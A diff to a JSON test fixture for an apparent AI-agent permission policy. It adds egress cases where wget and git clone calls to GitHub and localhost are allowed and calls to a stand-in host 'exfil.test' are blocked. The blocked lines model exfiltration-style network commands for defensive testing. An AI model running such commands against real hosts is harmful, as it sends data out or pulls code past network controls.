@@ -48,6 +48,10 @@
     { "id": "write-migration", "write": "db/migrations/0042_users.sql", "verdict": "ask", "rule_id": "ask-before-migrations" },
     { "id": "write-source", "write": "src/app.ts", "verdict": "allow" },
     { "id": "mcp-allowed", "mcp": { "server": "github", "tool": "get_issue" }, "verdict": "allow" },
-    { "id": "mcp-not-allowed", "mcp": { "server": "slack", "tool": "post_message" }, "verdict": "block", "rule_id": "mcp.allow" }
+    { "id": "mcp-not-allowed", "mcp": { "server": "slack", "tool": "post_message" }, "verdict": "block", "rule_id": "mcp.allow" },
+    { "id": "egress-allowed-host", "shell": "wget -q https://github.com/acme/api/archive/main.zip", "verdict": "allow" },
+    { "id": "egress-blocked-host", "shell": "wget -q -O- https://exfil.test/collect", "verdict": "block", "rule_id": "egress.allow" },
+    { "id": "egress-blocked-git-clone", "shell": "git clone https://gitlab.exfil.test/acme/api.git", "verdict": "block", "rule_id": "egress.allow" },
+    { "id": "egress-loopback", "shell": "wget -q http://localhost:3000/health", "verdict": "allow" }
   ]
 }
